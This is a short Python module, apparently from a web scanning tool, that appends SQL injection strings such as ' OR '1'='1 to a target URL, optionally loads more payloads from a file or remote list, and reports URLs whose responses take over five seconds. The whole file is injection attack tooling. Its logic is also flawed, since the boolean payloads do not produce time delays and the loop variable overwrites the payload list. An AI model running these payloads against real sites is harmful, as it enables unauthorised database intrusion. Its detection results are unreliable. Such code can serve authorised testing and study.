import requests
import time
from ..includes.filewrite import writetofile


def check_internet():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False


def cvescan(url=None, output=None, payload=None):
    try:
        while not check_internet():
            print("Waiting for internet connection...")
            time.sleep(5)
        if payload is None:
            sqli_payload = ["' OR '1'='1", "' OR '1'='1#", "' OR '1'='1--", "' OR '1'='1/*", "' OR '1'='1--"]
        else:
            if payload.startswith('http'):
                sqli_payload = requests.get(payload).text.splitlines()
            else:
                sqli_payload = open(payload, 'r').read().splitlines()
        print("This tool can test in get method and also in forms !!")
        for sqli_payload in sqli_payload:
            if sqli_payload.startswith('/'):
                sqli_payload = sqli_payload[1:]
            if sqli_payload is None:
                continue
            fullurl = url + sqli_payload
            print("Testing: " + fullurl)
            starttime = time.time()
            response = requests.get(fullurl)
            endtime = time.time()
            totaltime = endtime - starttime
            if totaltime > 5:
                print("May be Vulnerable: " + fullurl + " Response Time: " + str(totaltime))
                output_file = output + ".txt"  # Create a new variable for the output file
                writetofile(fullurl, output_file)  # Pass the new variable to writetofile
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
